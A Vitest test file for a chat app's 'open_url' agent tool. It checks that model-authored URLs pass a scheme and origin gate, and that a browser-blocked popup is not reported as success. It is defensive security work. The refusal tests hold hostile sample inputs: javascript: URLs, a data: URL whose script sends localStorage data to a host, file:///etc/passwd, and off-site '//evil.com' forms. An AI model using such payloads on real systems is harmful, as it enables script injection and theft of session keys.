// @vitest-environment node
import { describe, it, expect } from 'vitest'
import {
  decideOpenUrl,
  OPEN_URL_BLOCKED_NOTE,
  OPEN_URL_BLOCKED_TOAST,
  OPEN_URL_BLOCKED_ACTION,
} from '../lib/chat/open-url'

/**
 * Backlog v8 A1 — the voice bridge's `open_url` handed a model-authored string
 * straight to `window.open` and reported success unconditionally.
 *
 * Two defects, tested separately below: the missing scheme gate (the persona can
 * be a stranger's public tiny, and the origin it navigates holds the session +
 * BYOK keys), and the false `{ok:true}` (a websocket tool frame carries no user
 * gesture, so the popup is blocked and the agent narrates a tab that never
 * opened).
 */

describe('decideOpenUrl — what the agent is allowed to open', () => {
  it('allows the http(s) links the tool exists for', () => {
    for (const u of [
      'https://example.com',
      'https://example.com/path?q=1#frag',
      'http://192.168.1.9:4000/tx/0xabc',   // a self-hosted explorer on the LAN
      'HTTPS://EXAMPLE.COM',
    ]) {
      expect(decideOpenUrl(u), u).toEqual({ ok: true, href: u })
    }
  })

  it('allows same-origin paths and fragments — "open your wallet" is a real ask', () => {
    expect(decideOpenUrl('/wallet')).toEqual({ ok: true, href: '/wallet' })
    expect(decideOpenUrl('/@ada')).toEqual({ ok: true, href: '/@ada' })
    expect(decideOpenUrl('#main')).toEqual({ ok: true, href: '#main' })
  })

  it('refuses script/data/file schemes — this origin holds the session and the BYOK keys', () => {
    for (const u of [
      'javascript:alert(1)',
      'JavaScript:alert(1)',
      '  javascript:alert(1)  ',   // WHATWG parsing strips the padding itself
      'java\nscript:alert(1)',     // ...and the newline — both still parse as javascript:
      'data:text/html,<script>fetch("//x/"+localStorage.length)</script>',
      'file:///etc/passwd',
      'blob:https://tiny.technology/abc',
      'vbscript:msgbox',
    ]) {
      const d = decideOpenUrl(u)
      expect(d.ok, `${u} must be refused`).toBe(false)
    }
  })

  it('refuses the path-SHAPED forms that leave the site', () => {
    // Both resolve to another origin against any base — the trap in treating
    // "starts with /" as "internal".
    expect(new URL('//evil.com', 'https://tiny.technology').origin).toBe('https://evil.com')
    expect(new URL('/\\evil.com', 'https://tiny.technology').origin).toBe('https://evil.com')
    for (const u of ['//evil.com', '//evil.com/x', '/\\evil.com', '/\\\\evil.com']) {
      const d = decideOpenUrl(u)
      expect(d.ok, `${u} must be refused`).toBe(false)
      if (!d.ok) expect(d.error).toMatch(/leaves this site/)
    }
  })

  it('refuses app deep links by NAMING the scheme, so the agent stops retrying', () => {
    // The tool description offers maps:/spotify:/shortcuts: because the NATIVE
    // clients honour them. The browser isn't one, and "invalid url" would have
    // the agent rephrase and call again.
    const d = decideOpenUrl('maps:q=Berlin')
    expect(d.ok).toBe(false)
    if (!d.ok) {
      expect(d.error).toContain('maps:')
      expect(d.error).toMatch(/https:\/\/|path/)
    }
  })

  it('refuses a missing or non-string url', () => {
    for (const u of [undefined, null, '', '   ', 42, {}, ['https://ok.com']]) {
      expect(decideOpenUrl(u as unknown).ok, String(u)).toBe(false)
    }
    expect(decideOpenUrl(undefined)).toEqual({ ok: false, error: 'url required' })
  })

  it('refuses a bare word with the SHAPE it wants, not just "invalid"', () => {
    const d = decideOpenUrl('example.com')
    expect(d.ok).toBe(false)
    // A schemeless host is the most likely model mistake; the message has to be
    // the fix ("https:// or a path"), because this string is the tool result.
    if (!d.ok) expect(d.error).toMatch(/https:\/\//)
  })

  it('returns the href to USE, so the check and the navigation cannot diverge', () => {
    // The caller must open `d.href`, never its own original — the same rule
    // `explorerHref`'s docblock states. Trimming is why they can differ.
    const d = decideOpenUrl('  https://example.com/x  ')
    expect(d).toEqual({ ok: true, href: 'https://example.com/x' })
  })
})

describe('the popup-blocked outcome', () => {
  it('does not read as success, and does not read as failure', () => {
    // The agent speaks from this string. "Opened it" is a lie (no tab exists);
    // "couldn't open it" is also wrong (the user has a one-click path). It must
    // say what actually happened.
    expect(OPEN_URL_BLOCKED_NOTE).toMatch(/blocked/)
    expect(OPEN_URL_BLOCKED_NOTE).toMatch(/user/)
    expect(OPEN_URL_BLOCKED_NOTE).not.toMatch(/^opened/i)
  })

  it('the toast copy is for the USER and its action is the gesture', () => {
    expect(OPEN_URL_BLOCKED_TOAST).toMatch(/^Your browser/)
    expect(OPEN_URL_BLOCKED_ACTION).toMatch(/open/i)
    // Distinct strings: the model-facing note must never be shown as UI copy.
    expect(OPEN_URL_BLOCKED_TOAST).not.toBe(OPEN_URL_BLOCKED_NOTE)
  })
})

describe('the sink is wired to the decision', () => {
  const chat = () => {
    const { readFileSync } = require('node:fs') as typeof import('node:fs')
    const { join } = require('node:path') as typeof import('node:path')
    return readFileSync(join(__dirname, '..', 'components/chat/Chat.tsx'), 'utf8')
  }

  it('the open_url branch opens the DECIDED href, never args.url', () => {
    const src = chat()
    expect(src).toContain('decideOpenUrl(args?.url)')
    // The bug expressed as a scan: `window.open(args.url` is the old line.
    expect(src).not.toMatch(/window\.open\(\s*args[?.]*\.url/)
    expect(src).toContain('window.open(d.href, "_blank", "noopener")')
  })

  it('a null window is not reported as an opened tab', () => {
    const src = chat()
    // ⚠️ A file-wide `toContain('OPEN_URL_BLOCKED_NOTE')` passes on the IMPORT
    // line alone — verified by mutation: deleting the note from the return still
    // went green. The note has to be RETURNED, so the match is anchored to the
    // branch. (Same class as the c49/c52/c54 trap where a scan matched prose.)
    expect(src).toMatch(/if\s*\(!w\)\s*\{[\s\S]{0,600}?return\s*\{\s*ok:\s*true,\s*note:\s*OPEN_URL_BLOCKED_NOTE\s*\}/)
  })

  /**
   * The census: every place that navigates on a string the app did not author
   * must pass it through a gate first. This is the lens itself, kept as a test —
   * the four pre-existing sinks were each fixed in isolation (different cycles,
   * different loops), so nothing stopped the fifth from being added bare, which
   * is exactly what happened.
   */
  it('no navigation sink opens a third-party string ungated', () => {
    const { readFileSync } = require('node:fs') as typeof import('node:fs')
    const { join } = require('node:path') as typeof import('node:path')
    const repo = join(__dirname, '..')
    // ⚠️ Each pattern must match the gate being CALLED ON the untrusted value,
    // never just the identifier: mutation proved a bare /explorerHref/ passes on
    // wallet's own docblock, which explains the rule in prose. Comments are
    // stripped first for the same reason.
    const SINKS: { file: string; gate: RegExp; what: string }[] = [
      // voice bridge open_url — this cycle. Model-authored string, no gesture.
      { file: 'components/chat/Chat.tsx', gate: /decideOpenUrl\(\s*args/, what: "the agent's open_url" },
      // withdrawal explorer link — server string, opened with no click ON the URL
      { file: 'app/wallet/page.tsx', gate: /explorerHref\(\s*url\s*\)/, what: "the withdrawal's explorer link" },
      // receipt explorer link — same field, rendered as an href
      { file: 'components/chat/PayReceipt.tsx', gate: /explorerHref\(\s*settled\.explorer\s*\)/, what: "the receipt's explorer link" },
      // agent-embedded markdown image, wrapped in a LIVE <a href>
      { file: 'components/chat/MarkdownContent.tsx', gate: /test\(\s*raw\s*\)\s*\?/, what: "an agent-embedded image src" },
    ]
    for (const s of SINKS) {
      const src = readFileSync(join(repo, s.file), 'utf8')
        .replace(/\/\*[\s\S]*?\*\//g, '')   // block comments
        .replace(/^\s*\/\/.*$/gm, '')       // line comments
      expect(src, `${s.file} navigates on ${s.what} — that string must pass a gate`).toMatch(s.gate)
    }
  })
})
